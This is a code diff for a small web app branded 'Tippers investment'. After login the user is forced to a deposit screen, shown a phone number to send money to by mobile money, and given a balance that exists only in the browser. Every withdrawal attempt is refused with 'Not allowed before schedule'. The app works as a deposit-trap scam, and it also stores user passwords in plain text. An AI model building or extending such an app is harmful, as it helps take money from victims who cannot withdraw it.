@@ -62,7 +62,6 @@ font-weight:bold;
 cursor:pointer;
 }
 
-/* CARDS */
 .card{
 background:#1f2937;
 padding:15px;
@@ -71,7 +70,6 @@ border-radius:12px;
 cursor:pointer;
 }
 
-/* NAV */
 .nav{
 display:flex;
 justify-content:space-around;
@@ -82,7 +80,6 @@ padding:10px;
 .nav div{text-align:center;font-size:12px;cursor:pointer}
 .nav i{font-size:22px;display:block}
 
-/* BOX */
 .box{
 background:#1f2937;
 padding:12px;
@@ -163,6 +160,7 @@ let users=JSON.parse(localStorage.getItem("users"))||[];
 let currentUser=null;
 let currentAmount=0;
 let senderName="";
+let depositDone=false;
 
 function get(id){return document.getElementById(id);}
 
@@ -177,8 +175,8 @@ setTimeout(()=>t.style.display="none",2000);
 function welcome(){
 get("screen").innerHTML=`
 <h2 class="yellow">Welcome to Tippers</h2>
-<p>Grow your income smartly</p>
-<button onclick="login()">Start</button>
+<button onclick="register()">Register</button>
+<button onclick="login()">Login</button>
 `;
 }
 
@@ -189,9 +187,6 @@ get("screen").innerHTML=`
 <p class="yellow"><b>Most welcome to Tippers investment!</b></p>
 
 <h3>Register</h3>
-
-<label>FIRST NAME</label>
-<input id="fname">
 
 <label>EMAIL</label>
 <input id="email" placeholder="Enter your email">
@@ -220,8 +215,8 @@ get("screen").innerHTML=`
 
 <h3>Login</h3>
 
-<input id="logEmail" required placeholder="Enter email">
-<input id="logPass" required type="password" placeholder="Enter password">
+<input id="logEmail" placeholder="Enter email">
+<input id="logPass" type="password" placeholder="Enter password">
 
 <div class="passBox">
 <span class="eye" onclick="toggle('logPass')">👁</span>
@@ -233,32 +228,64 @@ get("screen").innerHTML=`
 `;
 }
 
+/* VALID REGISTER */
+function doRegister(){
+let email=get("email").value;
+let pass=get("pass").value;
+let cpass=get("cpass").value;
+
+if(!email || !pass || !cpass){
+toast("Fill all fields ❌"); return;
+}
+
+if(pass!==cpass){
+toast("Passwords do not match ❌"); return;
+}
+
+users.push({email,pass,balance:0});
+localStorage.setItem("users",JSON.stringify(users));
+
+toast("Registered ✔");
+login();
+}
+
+/* VALID LOGIN */
+function doLogin(){
+let email=get("logEmail").value;
+let pass=get("logPass").value;
+
+if(!email || !pass){
+toast("Fill all fields ❌"); return;
+}
+
+let u=users.find(x=>x.email===email && x.pass===pass);
+
+if(!u){
+toast("Account not found ❌"); return;
+}
+
+currentUser=u;
+get("bottomNav").classList.remove("hidden");
+
+toast("Login success");
+
+// FORCE DEPOSIT FIRST
+deposit();
+}
+
 /* HOME */
 function home(){
+if(!depositDone){
+toast("Complete deposit first ❌");
+deposit();
+return;
+}
+
 get("screen").innerHTML=`
-
-<div class="card" onclick="openCard('balance')">💰 Balance: ${currentUser.balance} RWF</div>
-<div class="card" onclick="openCard('plans')">📊 Investment Plans</div>
-<div class="card" onclick="openCard('tips')">💡 Tips</div>
-<div class="card" onclick="openCard('news')">📢 News</div>
-
+<div class="card">Balance: ${currentUser.balance} RWF</div>
+<div class="card">Investment plans available</div>
+<div class="card">Tips & news</div>
 `;
-}
-
-/* OPEN CARDS */
-function openCard(type){
-if(type==="balance"){
-get("screen").innerHTML=`<div class="box">Your balance is ${currentUser.balance} RWF</div>`;
-}
-if(type==="plans"){
-get("screen").innerHTML=`<div class="box">Plans: Daily, Weekly, Monthly profits</div>`;
-}
-if(type==="tips"){
-get("screen").innerHTML=`<div class="box">Tip: Invest wisely to grow faster</div>`;
-}
-if(type==="news"){
-get("screen").innerHTML=`<div class="box">New bonuses coming soon!</div>`;
-}
 }
 
 /* DEPOSIT */
@@ -269,17 +296,17 @@ get("screen").innerHTML=`
 
 <p>Add funds using MTN Mobile Money</p>
 
-<p class="yellow">AMOUNT TO DEPOSIT (RWF)</p>
+<p class="yellow">AMOUNT</p>
 
 <div class="inputBox">
 <span>RWF</span>
-<input id="amount" placeholder="100,000">
+<input id="amount">
 </div>
 
 <p>Minimum: 5,000</p>
 
-<p class="yellow">SENDER MOBILE NAME</p>
-<input id="sender" placeholder="mugabo jean paul">
+<p class="yellow">SENDER NAME</p>
+<input id="sender">
 
 <button onclick="payment()">Continue ➜</button>
 `;
@@ -290,19 +317,15 @@ function payment(){
 currentAmount=parseInt(get("amount").value)||0;
 senderName=get("sender").value;
 
-if(currentAmount<5000){
-toast("Minimum 5000");return;
+if(currentAmount<5000 || !senderName){
+toast("Fill all fields ❌"); return;
 }
 
 get("screen").innerHTML=`
 
 <h3 class="yellow">PAYMENT INFORMATIONS</h3>
 
-<p>Follow steps to complete payment</p>
-
 <div class="box">Sender: ${senderName}</div>
-
-<p>Send ${currentAmount} RWF to:</p>
 
 <div class="box">
 0795410739 
@@ -338,10 +361,11 @@ function enableBtn(){get("btn").disabled=false;}
 function proof(){
 currentUser.balance+=currentAmount;
 localStorage.setItem("users",JSON.stringify(users));
+depositDone=true;
 withdrawStep();
 }
 
-/* WITHDRAW PERIOD */
+/* WITHDRAW STEP */
 function withdrawStep(){
 get("screen").innerHTML=`
 
@@ -362,6 +386,10 @@ get("screen").innerHTML=`
 
 /* WITHDRAW */
 function withdrawUI(){
+if(!depositDone){
+toast("Finish deposit first ❌"); return;
+}
+
 get("screen").innerHTML=`
 
 <h3>Withdraw</h3>
@@ -376,32 +404,13 @@ get("screen").innerHTML=`
 }
 
 function withdrawAction(){
-toast("You're not allowed before schedule");
+toast("Not allowed before schedule ❌");
 }
 
-/* LOGIC */
+/* TOGGLE */
 function toggle(id){
 let p=get(id);
 p.type=p.type==="password"?"text":"password";
-}
-
-function doRegister(){
-users.push({
-email:get("email").value,
-pass:get("pass").value,
-balance:0
-});
-localStorage.setItem("users",JSON.stringify(users));
-toast("Registered");
-login();
-}
-
-function doLogin(){
-let u=users.find(x=>x.email===get("logEmail").value && x.pass===get("logPass").value);
-if(!u){toast("Invalid");return;}
-currentUser=u;
-get("bottomNav").classList.remove("hidden");
-home();
 }
 
 /* START */
